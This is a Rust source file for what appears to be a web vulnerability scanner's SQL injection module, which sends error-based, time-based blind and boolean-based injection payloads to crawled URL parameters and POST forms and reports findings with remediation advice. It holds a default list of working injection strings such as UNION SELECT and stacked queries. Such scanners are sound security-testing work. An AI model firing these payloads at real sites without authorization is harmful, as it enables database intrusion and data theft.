use async_trait::async_trait;
use regex::Regex;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};
use crate::scanners::traits::VulnerabilityScanner;
use crate::core::crawler::CrawledPage;
use crate::reporting::models::Vulnerability;
use crate::error::VenomResult;

pub struct SqliScanner {
    payloads_path: PathBuf,
}

impl SqliScanner {
    pub fn new(payloads_path: &Path) -> Self {
        Self {
            payloads_path: payloads_path.to_path_buf(),
        }
    }

    fn load_payloads(&self) -> Vec<String> {
        if let Ok(content) = std::fs::read_to_string(&self.payloads_path) {
            content.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty() && !l.starts_with('#')).collect()
        } else {
            default_sqli_payloads()
        }
    }
}

#[async_trait]
impl VulnerabilityScanner for SqliScanner {
    fn name(&self) -> &str { "SQL Injection Scanner" }
    fn description(&self) -> &str { "Tests for error-based, boolean-blind, and time-based SQL injection" }

    async fn scan(
        &self,
        pages: &[CrawledPage],
        client: &reqwest::Client,
    ) -> VenomResult<Vec<Vulnerability>> {
        let mut vulns = Vec::new();
        let payloads = self.load_payloads();

        let error_patterns = vec![
            Regex::new(r"(?i)sql syntax.*mysql").unwrap(),
            Regex::new(r"(?i)warning.*mysql_").unwrap(),
            Regex::new(r"(?i)unclosed quotation mark").unwrap(),
            Regex::new(r"(?i)microsoft OLE DB Provider for SQL Server").unwrap(),
            Regex::new(r"(?i)postgresql.*error").unwrap(),
            Regex::new(r"(?i)ORA-\d{5}").unwrap(),
            Regex::new(r"(?i)sqlite3?\.OperationalError").unwrap(),
            Regex::new(r"(?i)pg_query\(\)").unwrap(),
            Regex::new(r"(?i)valid MySQL result").unwrap(),
            Regex::new(r"(?i)Syntax error.*in query expression").unwrap(),
            Regex::new(r"(?i)unterminated quoted string").unwrap(),
            Regex::new(r"(?i)quoted string not properly terminated").unwrap(),
        ];

        for page in pages {
            // Test URL parameters
            for (param_name, param_value) in &page.params {
                for payload in &payloads {
                    // Error-based SQLi
                    let test_url = inject_param(&page.url, param_name, payload);
                    if let Ok(resp) = client.get(&test_url).send().await {
                        if let Ok(body) = resp.text().await {
                            for pattern in &error_patterns {
                                if pattern.is_match(&body) {
                                    vulns.push(create_sqli_vuln(
                                        &page.url, param_name, payload,
                                        "Error-Based SQL Injection",
                                        &pattern.to_string(),
                                        "CRITICAL",
                                    ));
                                    break;
                                }
                            }
                        }
                    }
                }

                // Time-based blind SQLi
                let time_payloads = vec![
                    format!("{}'%20OR%20SLEEP(5)--", param_value),
                    format!("{}' OR pg_sleep(5)--", param_value),
                    format!("{}' WAITFOR DELAY '0:0:5'--", param_value),
                ];

                for payload in &time_payloads {
                    let test_url = inject_param(&page.url, param_name, payload);
                    let start = Instant::now();
                    if let Ok(_resp) = client.get(&test_url).send().await {
                        let elapsed = start.elapsed();
                        if elapsed >= Duration::from_secs(4) {
                            vulns.push(create_sqli_vuln(
                                &page.url, param_name, payload,
                                "Time-Based Blind SQL Injection",
                                &format!("Response delayed by {:.1}s", elapsed.as_secs_f64()),
                                "CRITICAL",
                            ));
                            break;
                        }
                    }
                }

                // Boolean-based blind SQLi
                let true_url = inject_param(&page.url, param_name, &format!("{} OR 1=1", param_value));
                let false_url = inject_param(&page.url, param_name, &format!("{} OR 1=2", param_value));

                let true_resp = client.get(&true_url).send().await.ok();
                let false_resp = client.get(&false_url).send().await.ok();

                if let (Some(tr), Some(fr)) = (true_resp, false_resp) {
                    let true_body = tr.text().await.unwrap_or_default();
                    let false_body = fr.text().await.unwrap_or_default();

                    if true_body.len() != false_body.len() {
                        let diff = (true_body.len() as i64 - false_body.len() as i64).abs();
                        if diff > 100 {
                            vulns.push(create_sqli_vuln(
                                &page.url, param_name,
                                "OR 1=1 / OR 1=2",
                                "Boolean-Based Blind SQL Injection",
                                &format!("Response length diff: {} bytes", diff),
                                "HIGH",
                            ));
                        }
                    }
                }
            }

            // Test forms
            for form in &page.forms {
                if form.method == "POST" {
                    for input in &form.inputs {
                        for payload in payloads.iter().take(5) {
                            let mut form_data = std::collections::HashMap::new();
                            for inp in &form.inputs {
                                if inp.name == input.name {
                                    form_data.insert(inp.name.clone(), payload.clone());
                                } else {
                                    form_data.insert(inp.name.clone(), inp.value.clone());
                                }
                            }

                            if let Ok(resp) = client.post(&form.action).form(&form_data).send().await {
                                if let Ok(body) = resp.text().await {
                                    for pattern in &error_patterns {
                                        if pattern.is_match(&body) {
                                            vulns.push(create_sqli_vuln(
                                                &form.action, &input.name, payload,
                                                "Error-Based SQL Injection (POST)",
                                                &pattern.to_string(),
                                                "CRITICAL",
                                            ));
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(vulns)
    }
}

fn inject_param(url: &str, param: &str, payload: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed.query_pairs()
            .map(|(k, v)| {
                if k == param {
                    (k.to_string(), payload.to_string())
                } else {
                    (k.to_string(), v.to_string())
                }
            })
            .collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in pairs {
            parsed.query_pairs_mut().append_pair(&k, &v);
        }
        parsed.to_string()
    } else {
        url.to_string()
    }
}

fn create_sqli_vuln(url: &str, param: &str, payload: &str, title: &str, evidence: &str, severity: &str) -> Vulnerability {
    let mut vuln = Vulnerability::new(title, "SQL Injection", severity, url);
    vuln.parameter = Some(param.to_string());
    vuln.payload = Some(payload.to_string());
    vuln.evidence = evidence.to_string();
    vuln.description = format!(
        "SQL Injection was detected in the '{}' parameter. The application appears to \
         incorporate user input directly into SQL queries without proper sanitization.",
        param
    );
    vuln.impact = "An attacker could read, modify, or delete database contents, \
         potentially leading to full data breach or system compromise.".to_string();
    vuln.remediation = "1. Use parameterized queries (prepared statements)\n\
         2. Implement input validation with allowlists\n\
         3. Apply principle of least privilege to database accounts\n\
         4. Deploy a Web Application Firewall (WAF)".to_string();
    vuln.cwe_id = Some("CWE-89".to_string());
    vuln.references = vec![
        "https://owasp.org/www-community/attacks/SQL_Injection".to_string(),
        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html".to_string(),
    ];
    vuln
}

fn default_sqli_payloads() -> Vec<String> {
    vec![
        "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
        "' OR 1=1#", "admin'--", "1' ORDER BY 1--", "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--", "' AND 1=CONVERT(int,(SELECT @@version))--",
        "1;SELECT * FROM users", "' OR ''='", "') OR ('1'='1",
        "1' AND '1'='1", "1' AND '1'='2", "1 OR 1=1", "1' OR '1'='1'/*",
    ].iter().map(|s| s.to_string()).collect()
}